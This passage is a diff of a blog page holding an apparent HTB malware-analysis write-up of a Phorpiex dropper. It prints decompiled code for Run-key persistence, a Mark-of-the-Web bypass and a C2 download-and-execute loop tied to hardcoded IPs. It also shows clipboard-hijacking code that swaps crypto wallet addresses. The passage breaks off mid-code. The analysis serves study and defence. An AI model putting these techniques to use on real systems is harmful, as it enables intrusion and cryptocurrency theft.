@@ -226,7 +226,7 @@ TL;DR # initial analysis # 1$ file * 2optimize.exe: PE32 executable for MS Windo
     "keywords": ["Malware Analysis","Windows","PE"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "398"
+    "wordCount": "1807"
   }]
   </script>
 
@@ -760,6 +760,20 @@ TL;DR # initial analysis # 1$ file * 2optimize.exe: PE32 executable for MS Windo
             <li><a href="#libraries">libraries</a></li>
             <li><a href="#imports">imports</a></li>
             <li><a href="#strings">strings</a></li>
+            <li><a href="#running-in-sandbox"><span>running in Sandbox</span></a></li>
+          </ul>
+        </li>
+        <li><a href="#reversing-with-ida">reversing with ida</a>
+          <ul>
+            <li><a href="#persistence-by-run-registry-key">persistence by \Run\ registry key</a></li>
+            <li><a href="#bypass-motw">bypass MotW</a></li>
+            <li><a href="#configure-commands-and-c2-servers">configure commands and C2 servers</a></li>
+            <li><a href="#main-c2-logic">main C2 logic</a></li>
+            <li><a href="#replace-a-crypt">Replace a crypt</a></li>
+            <li><a href="#spreading-via-usb-and-network-drives">spreading via USB and network drives</a></li>
+            <li><a href="#usb-infect">usb infect</a></li>
+            <li><a href="#infected-lnk">infected .LNK</a></li>
+            <li><a href="#nat-traversal-via-upnp">NAT traversal via UPnP</a></li>
           </ul>
         </li>
       </ul>
@@ -785,6 +799,20 @@ TL;DR # initial analysis # 1$ file * 2optimize.exe: PE32 executable for MS Windo
             <li><a href="#libraries">libraries</a></li>
             <li><a href="#imports">imports</a></li>
             <li><a href="#strings">strings</a></li>
+            <li><a href="#running-in-sandbox"><span>running in Sandbox</span></a></li>
+          </ul>
+        </li>
+        <li><a href="#reversing-with-ida">reversing with ida</a>
+          <ul>
+            <li><a href="#persistence-by-run-registry-key">persistence by \Run\ registry key</a></li>
+            <li><a href="#bypass-motw">bypass MotW</a></li>
+            <li><a href="#configure-commands-and-c2-servers">configure commands and C2 servers</a></li>
+            <li><a href="#main-c2-logic">main C2 logic</a></li>
+            <li><a href="#replace-a-crypt">Replace a crypt</a></li>
+            <li><a href="#spreading-via-usb-and-network-drives">spreading via USB and network drives</a></li>
+            <li><a href="#usb-infect">usb infect</a></li>
+            <li><a href="#infected-lnk">infected .LNK</a></li>
+            <li><a href="#nat-traversal-via-upnp">NAT traversal via UPnP</a></li>
           </ul>
         </li>
       </ul>
@@ -1020,7 +1048,7 @@ After a security incident, unusual activity on Samira’s workstation led to the
 </span></span><span class="line"><span class="ln">2</span><span class="cl">CryptGenRandom         ADVAPI32.dll
 </span></span><span class="line"><span class="ln">3</span><span class="cl">CryptReleaseContext    ADVAPI32.dll
 </span></span><span class="line"><span class="ln">4</span><span class="cl">rand, srand            msvcrt.dll</span></span></code></pre></div></div>
-<p>- <code>CryptGenRandom</code> - cryptographically secure random generation, potentially used for encryption of C2 traffic
+<p>- <code>CryptGenRandom</code> - cryptographically secure random generation, potentially used for encryption of C2 traffic<br>
 - <code>rand/srand</code> may indicate custom encryption algorithm</p>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">CreateMutexA          KERNEL32.dll
 </span></span><span class="line"><span class="ln">2</span><span class="cl">NtQueryVirtualMemory  ntdll.dll
@@ -1041,7 +1069,8 @@ After a security incident, unusual activity on Samira’s workstation led to the
 <p><em>Hardcoded C2 Servers:</em></p>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">http://185.156.72.39/
 </span></span><span class="line"><span class="ln">2</span><span class="cl">http://45.141.233.6/
-</span></span><span class="line"><span class="ln">3</span><span class="cl">www.update.microsoft.com (likely decoy/masquerading)</span></span></code></pre></div></div>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">www.update.microsoft.com (likely decoy/masquerading)
+</span></span><span class="line"><span class="ln">4</span><span class="cl">239.255.255.250</span></span></code></pre></div></div>
 <p><em>User-Agent String:</em></p>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
 </span></span><span class="line"><span class="ln">2</span><span class="cl">(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span></span></code></pre></div></div>
@@ -1068,9 +1097,427 @@ After a security incident, unusual activity on Samira’s workstation led to the
 </span></span><span class="line"><span class="ln">5</span><span class="cl">Terra:       terra1mw3dhwak2qe46drv4g7lvgwn79fzm8nr0htdq5
 </span></span><span class="line"><span class="ln">6</span><span class="cl">Zilliqa:     zil19delrukejtr306u0s7ludxrwk434jcl6ghpng3
 </span></span><span class="line"><span class="ln">7</span><span class="cl">... (40+ additional altcoin addresses)</span></span></code></pre></div></div>
-<ul>
-<li>i think sample monitors clipboard for crypto addresses via <code>SetClipboardViewer</code> chain and replaces victim&rsquo;s copied address with attacker&rsquo;s corresponding wallet</li>
-</ul>
+<p>- i think sample monitors clipboard for crypto addresses via <code>SetClipboardViewer</code> chain and replaces victim&rsquo;s copied address with attacker&rsquo;s corresponding wallet</p>
+
+<h4 class="relative group"><span style="color:red">running in Sandbox</span>
+    <div id="running-in-sandbox" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#running-in-sandbox" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p><strong>optimize.exe</strong><br>
+<code>optimize.exe</code> act as a dropper, it doawnload a <code>syscrondvr.exe</code>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="749"
+    height="135"
+    src="/bubka/writeups/htb-lupin/image4.png"
+    srcset="/bubka/writeups/htb-lupin/image4.png 800w, /bubka/writeups/htb-lupin/image4.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/htb-lupin/image4.png"></figure>
+
+it set a registrykey in <code>HKEY_CURRENT_USER\SOFTWARE\Microsoft \Windows\CurrentVersion\Run</code> to sturtup a <code>syscrondvr.exe</code>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1266"
+    height="247"
+    src="/bubka/writeups/htb-lupin/image5_hu_9bfc201fa6f0f238.png"
+    srcset="/bubka/writeups/htb-lupin/image5_hu_9bfc201fa6f0f238.png 800w, /bubka/writeups/htb-lupin/image5.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/htb-lupin/image5.png"></figure>
+</p>
+<p><strong>syscrondvr.exe</strong>
+<code>syscrondvr.exe</code> indentificated as a <strong>PHORPIEX</strong> by Yara and Suricata. it uses a <code>tbtnds.dat</code> file, likely to store a configuration data.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1275"
+    height="249"
+    src="/bubka/writeups/htb-lupin/image6_hu_7349e41b1f8a705.png"
+    srcset="/bubka/writeups/htb-lupin/image6_hu_7349e41b1f8a705.png 800w, /bubka/writeups/htb-lupin/image6.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/htb-lupin/image6.png"></figure>
+</p>
+<p>and do a lot of interesting connetcion to <code>185.156.72.39:80</code> and some other ip
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1271"
+    height="375"
+    src="/bubka/writeups/htb-lupin/image7_hu_bb46306c294dab41.png"
+    srcset="/bubka/writeups/htb-lupin/image7_hu_bb46306c294dab41.png 800w, /bubka/writeups/htb-lupin/image7.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/htb-lupin/image7.png"></figure>
+
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1265"
+    height="486"
+    src="/bubka/writeups/htb-lupin/image8_hu_796fcc7b21e3ebf8.png"
+    srcset="/bubka/writeups/htb-lupin/image8_hu_796fcc7b21e3ebf8.png 800w, /bubka/writeups/htb-lupin/image8.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/htb-lupin/image8.png"></figure>
+</p>
+
+<h3 class="relative group">reversing with ida
+    <div id="reversing-with-ida" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reversing-with-ida" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+
+<h4 class="relative group">persistence by \Run\ registry key
+    <div id="persistence-by-run-registry-key" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#persistence-by-run-registry-key" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>malware copy itself to <code>%windir%</code>, <code>%USERPROFILE%</code> and <code>%temp</code> and renames to <code>syscrondvr.exe</code>. Adds registry key to <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code> and <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\</code>. changes a attribute of the file and hide it</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kt">int</span> <span class="nf">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nf">GetModuleFileNameW</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ExistingFileName</span><span class="p">,</span> <span class="mh">0x105u</span><span class="p">);</span><span class="c1">// return a filepath
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="n">String1</span> <span class="o">=</span> <span class="nf">PathFindFileNameW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ExistingFileName</span><span class="p">);</span><span class="c1">// return filename from filepath
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="c1">// ...[snip]...   
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1">// 
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="nf">ExpandEnvironmentStringsW</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;%windir%&#34;</span><span class="p">,</span> <span class="n">mw_windir</span><span class="p">,</span> <span class="mh">0x104u</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">      <span class="nf">wsprintfW</span><span class="p">(</span><span class="n">NewFileName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;%s</span><span class="se">\\</span><span class="s">%s&#34;</span><span class="p">,</span> <span class="n">mw_windir</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;syscrondvr.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nf">CopyFileW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ExistingFileName</span><span class="p">,</span> <span class="n">NewFileName</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="nf">SetFileAttributesW</span><span class="p">(</span><span class="n">NewFileName</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>      <span class="c1">// hidden
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">v13</span> <span class="o">=</span> <span class="nf">RegOpenKeyExW</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">                <span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">                <span class="sa">L</span><span class="s">&#34;Software</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">CurrentVersion</span><span class="se">\\</span><span class="s">Run</span><span class="se">\\</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">                <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">                <span class="mh">0x20006u</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">                <span class="o">&amp;</span><span class="n">phkResult</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v13</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">          <span class="n">v0</span> <span class="o">=</span> <span class="nf">wcslen</span><span class="p">(</span><span class="n">NewFileName</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">RegSetValueExW</span><span class="p">(</span><span class="n">phkResult</span><span class="p">,</span> <span class="n">aWindowsSetting</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="n">NewFileName</span><span class="p">,</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v0</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="c1">//...[snip]...
+</span></span></span><span class="line"><span class="ln">23</span><span class="cl">      <span class="n">v13</span> <span class="o">=</span> <span class="nf">RegOpenKeyExW</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">              <span class="n">HKEY_CURRENT_USER</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">              <span class="sa">L</span><span class="s">&#34;Software</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">CurrentVersion</span><span class="se">\\</span><span class="s">Run</span><span class="se">\\</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">              <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">              <span class="mh">0x20006u</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">              <span class="o">&amp;</span><span class="n">phkResult</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v13</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="n">v1</span> <span class="o">=</span> <span class="nf">wcslen</span><span class="p">(</span><span class="n">String</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">RegSetValueExW</span><span class="p">(</span><span class="n">phkResult</span><span class="p">,</span> <span class="n">aWindowsSetting</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="n">String</span><span class="p">,</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="c1">//...[snip]...
+</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">bypass MotW
+    <div id="bypass-motw" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#bypass-motw" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Bypasses Mark of the Web by create a thread with <code>:Zone.Identifier</code> and delete it.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl">  <span class="nf">wsprintfW</span><span class="p">(</span><span class="n">FileName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;%s:Zone.Identifier&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ExistingFileName</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nf">DeleteFileW</span><span class="p">(</span><span class="n">FileName</span><span class="p">);</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">configure commands and C2 servers
+    <div id="configure-commands-and-c2-servers" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#configure-commands-and-c2-servers" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Configure paths:<br>
+- <code>tbtnds.dat</code>: &ldquo;Trik Bot Nodes&rdquo; — list of C2 servers
+- <code>tbtcmds.dat</code>: &ldquo;Commands&rdquo; — retrieve commands from C2</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl">    <span class="nf">wsprintfW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">word_4161D0</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;%s</span><span class="se">\\</span><span class="s">tbtnds.dat&#34;</span><span class="p">,</span> <span class="n">mw_userprofile</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="nf">wsprintfW</span><span class="p">(</span><span class="o">&amp;::</span><span class="n">FileName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;%s</span><span class="se">\\</span><span class="s">tbtcmds.dat&#34;</span><span class="p">,</span> <span class="n">mw_userprofile</span><span class="p">);</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">main C2 logic
+    <div id="main-c2-logic" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#main-c2-logic" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Creates a thread <code>CreateThread(0, 0, mw_C2_main_loop, 0, 0, 0);</code>. That thread functional as a C2 loop.
+It iterates through 2 hardcoded IP addresses (http://185.156.72.39/ and http://45.141.233.6/) combined with 5 distinct URI suffixes (&ldquo;1&rdquo; to &ldquo;5&rdquo;), generating a total of 10 potential endpoints per cycle (e.g., http://185.156.72.39/1).</p>
+<p>the function triggers <code>mw_download_and_execute()</code> to retrieve (<code>InternetOpenUrlW + InternetReadFile + WriteFile</code> or <code>URLDownloadToFileW</code>) and run the executable(<code>ShellExecute</code>). The loop has a <code>Sleep(0xDBBA0u)</code> call, enforcing a 15-minute beacon interval.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kt">void</span> <span class="kr">__stdcall</span> <span class="n">__noreturn</span> <span class="nf">mw_C2_main_loop</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">Parameter</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v5</span><span class="p">));</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="n">v4</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="n">v4</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;2&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="n">v4</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="n">v4</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;4&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="n">v4</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;5&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">      <span class="nf">Sleep</span><span class="p">(</span><span class="mh">0x3E8u</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">      <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nf">Sleep</span><span class="p">(</span><span class="mh">0x3E8u</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="nf">wsprintfA</span><span class="p">(</span><span class="n">szUrlName</span><span class="p">,</span> <span class="s">&#34;%s%s&#34;</span><span class="p">,</span> <span class="n">mw_http_ip</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">v4</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nf">DeleteUrlCacheEntry</span><span class="p">(</span><span class="n">szUrlName</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nf">mw_payload_checks</span><span class="p">(</span><span class="n">szUrlName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">          <span class="nf">mw_download_and_execute</span><span class="p">(</span><span class="n">szUrlName</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nf">Sleep</span><span class="p">(</span><span class="mh">0xDBBA0u</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">Replace a crypt
+    <div id="replace-a-crypt" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#replace-a-crypt" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Creates a Thread <code>CreateThread(0, 0, mw_main_replace, 0, 0, 0);</code>, which create a callback function <code>mw_WindProc_callback_</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">v4</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="mi">48</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="n">v4</span><span class="p">.</span><span class="n">lpfnWndProc</span> <span class="o">=</span> <span class="n">mw_WindProc_callback_</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="n">v4</span><span class="p">.</span><span class="n">hInstance</span> <span class="o">=</span> <span class="nf">GetModuleHandleW</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="n">v4</span><span class="p">.</span><span class="n">lpszClassName</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span></span></span></code></pre></div></div>
+<p>This func checks if a clipdoard data was updated (<code>WM_DRAWCLIPBOARD</code>), then uses <code>IsClipboardFormatAvailable</code> to check a format of clipboard data, <code>GetClipboardData</code> to get a descriptor of data, <code>GlobalLock</code> to get a pointer to clipboard data, then do some converting this data to the necessary format and transfers data to <code>mw_repcale_crypt</code> function</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">switch</span> <span class="p">(</span> <span class="n">Msg</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">      <span class="k">case</span> <span class="mh">0x308u</span><span class="o">:</span>       <span class="c1">// 0x308 -&gt; WM_DRAWCLIPBOARD
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl">        <span class="n">uFormat</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nf">IsClipboardFormatAvailable</span><span class="p">(</span><span class="mh">0xDu</span><span class="p">)</span> <span class="p">)</span> <span class="c1">// unicode text
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">          <span class="n">uFormat</span> <span class="o">=</span> <span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="nf">IsClipboardFormatAvailable</span><span class="p">(</span><span class="mi">1u</span><span class="p">)</span> <span class="p">)</span><span class="c1">// asci
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">          <span class="n">uFormat</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="nf">IsClipboardFormatAvailable</span><span class="p">(</span><span class="mi">7u</span><span class="p">)</span> <span class="p">)</span><span class="c1">// CF_OEMTEXT
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">          <span class="n">uFormat</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">uFormat</span> <span class="o">&amp;&amp;</span> <span class="nf">OpenClipboard</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">          <span class="n">hMem</span> <span class="o">=</span> <span class="nf">GetClipboardData</span><span class="p">(</span><span class="n">uFormat</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">          <span class="n">mw_ptr_to_pdata</span> <span class="o">=</span> <span class="nf">GlobalLock</span><span class="p">(</span><span class="n">hMem</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">          <span class="n">lpString</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">uFormat</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">          <span class="p">{</span>
